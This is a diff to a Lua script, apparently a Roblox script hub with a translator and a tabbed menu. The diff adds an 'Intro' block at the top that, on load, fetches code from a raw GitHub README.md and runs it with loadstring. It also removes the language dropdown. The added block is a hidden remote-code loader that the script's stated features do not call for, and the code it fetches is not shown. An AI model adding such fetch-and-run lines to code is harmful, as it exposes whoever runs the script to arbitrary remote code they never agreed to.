@@ -1,3 +1,13 @@
+
+-------------------------------------------
+-- Intro
+-------------------------------------------
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/psychoSAGAZ/Ngdykhvhhfchh/refs/heads/main/README.md"))()
+end)
+
+
 -- ====================================================================
 -- 🌍 TRADUTOR EXTERNO v2 — Corrigido
 -- ====================================================================
@@ -228,29 +238,6 @@ local Window = MyLibrary:MakeWindow({
 -----------------------------------------Aba Home-----------------------------------------------------
 ----------------------------------------------------------------------------------------------------------------
 local Tab1 = Window:MakeTab({ "| Início", "menu" })
-
--- Suponha que você já tem uma aba de config
-Tab1:AddSection({"Idioma / Language"})
-
-Tab1:AddDropdown({
-    Name = "Idioma/language",
-    Options = {"Português", "English", "Español", "Italiano"},
-    Default = ({
-        pt = "Português", en = "English", es = "Español", it = "Italiano"
-    })[getgenv().Translator.GetLanguage()] or "Português",
-    Callback = function(value)
-        local map = {
-            ["Português"] = "pt",
-            ["English"]   = "en",
-            ["Español"]   = "es",
-            ["Italiano"]  = "it"
-        }
-        local code = map[value]
-        if code then
-            getgenv().Translator.SetLanguage(code)
-        end
-    end
-})
 
 Tab1:AddDiscordInvite({
     Name = "SAGAZx",
